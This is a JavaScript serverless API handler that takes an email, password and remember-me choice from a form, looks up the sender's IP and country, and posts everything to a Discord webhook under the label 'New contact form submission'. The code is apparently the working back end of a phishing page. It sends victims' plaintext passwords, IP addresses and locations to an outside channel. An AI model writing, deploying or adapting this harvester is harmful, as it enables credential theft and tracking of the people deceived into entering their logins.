export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { email, password, remember } = req.body || {};

    const safeEmail = String(email || '').trim();
    const safePassword = String(password || '').trim();
    const safeRemember = remember ? 'Yes' : 'No';

    if (!safeEmail || !safePassword) {
      return res.status(400).json({ error: 'Missing required fields' });
    }

    const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
    if (!webhookUrl) {
      return res.status(500).json({ error: 'Server misconfigured' });
    }

    // Get client IP
    const forwarded = req.headers['x-forwarded-for'];
    const ip = forwarded
      ? forwarded.split(',')[0].trim()
      : req.socket.remoteAddress;

    // Default fallback
    let country = 'Unknown';

    try {
      // Lookup country from IP
      const geoRes = await fetch(`http://ip-api.com/json/${ip}`);
      const geoData = await geoRes.json();

      if (geoData?.status === 'success') {
        country = geoData.country || 'Unknown';
      }
    } catch (e) {
      console.error('Geo lookup failed:', e);
    }

    const payload = {
      content: '**New contact form submission**',
      embeds: [
        {
          title: 'Contact Form',
          fields: [
            { name: 'Email', value: safeEmail, inline: true },
            { name: 'Password', value: safePassword, inline: true },
            { name: 'Remember Me', value: safeRemember, inline: true },
            { name: 'IP Address', value: ip || 'Unknown', inline: true },
            { name: 'Country', value: country, inline: true }
          ],
          timestamp: new Date().toISOString()
        }
      ]
    };

    const r = await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });

    if (!r.ok) {
      const text = await r.text();
      return res.status(502).json({ error: 'Webhook failed', details: text });
    }

    return res.status(200).json({ success: true });
  } catch (err) {
    console.error(err);
    return res.status(500).json({ error: 'Internal server error' });
  }
}
